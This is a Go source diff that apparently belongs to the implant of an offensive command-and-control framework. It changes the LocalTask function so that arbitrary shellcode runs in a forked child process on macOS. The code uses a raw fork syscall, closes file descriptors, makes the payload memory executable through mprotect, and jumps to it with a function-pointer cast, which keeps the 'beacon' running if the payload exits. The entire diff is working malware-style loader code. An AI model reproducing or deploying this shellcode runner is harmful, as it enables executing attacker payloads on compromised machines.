@@ -34,21 +34,60 @@ import (
 	"unsafe"
 )
 
-// LocalTask - Run a shellcode in the current process
-// Will hang the process until shellcode completion
-// TODO: actually test this code
-// Adapted/stolen from: https://github.com/lesnuages/hershell/blob/master/shell/shell_default.go#L48
+//go:linkname localTaskBeforeFork syscall.runtime_BeforeFork
+func localTaskBeforeFork()
+
+//go:linkname localTaskAfterFork syscall.runtime_AfterFork
+func localTaskAfterFork()
+
+//go:linkname localTaskAfterForkInChild syscall.runtime_AfterForkInChild
+func localTaskAfterForkInChild()
+
+// LocalTask - Run shellcode in a forked child; blocks until the child exits.
+// Forking isolates the beacon from payloads that exit/execve (issue #2237).
 func LocalTask(data []byte, rwxPages bool) error {
 	dataAddr := uintptr(unsafe.Pointer(&data[0]))
 	page := getPage(dataAddr)
-	syscall.Mprotect(page, syscall.PROT_READ|syscall.PROT_EXEC)
+	pageAddr := uintptr(unsafe.Pointer(&page[0]))
+	pageLen := uintptr(len(page))
 	dataPtr := unsafe.Pointer(&data)
+	// funcPtr trick from hershell (https://github.com/lesnuages/hershell)
 	funcPtr := *(*func())(unsafe.Pointer(&dataPtr))
+
 	runtime.LockOSThread()
-	defer runtime.UnlockOSThread()
-	go func(fPtr func()) {
-		fPtr()
-	}(funcPtr)
+	localTaskBeforeFork()
+	// Raw SYS_FORK on Darwin: r0 holds child's pid in BOTH processes; r1==1
+	// flags the child (libSystem's fork() wrapper hides this).
+	r0, isChild, errno := syscall.RawSyscall(syscall.SYS_FORK, 0, 0, 0)
+	if errno != 0 {
+		localTaskAfterFork()
+		runtime.UnlockOSThread()
+		return errno
+	}
+	if isChild == 1 {
+		localTaskAfterForkInChild()
+		for fd := uintptr(3); fd < 1024; fd++ {
+			syscall.RawSyscall(syscall.SYS_CLOSE, fd, 0, 0)
+		}
+		syscall.RawSyscall(syscall.SYS_MPROTECT, pageAddr, pageLen, uintptr(syscall.PROT_READ|syscall.PROT_EXEC))
+		funcPtr()
+		for {
+			syscall.RawSyscall(syscall.SYS_EXIT, 0, 0, 0)
+		}
+	}
+	localTaskAfterFork()
+	var ws syscall.WaitStatus
+	_, err := syscall.Wait4(int(r0), &ws, 0, nil)
+	runtime.UnlockOSThread()
+	if err != nil {
+		return err
+	}
+	if ws.Signaled() {
+		return fmt.Errorf("shellcode child killed by signal %v", ws.Signal())
+	}
+	if ws.ExitStatus() != 0 {
+		return fmt.Errorf("shellcode child exited %d", ws.ExitStatus())
+	}
 	return nil
 }
 
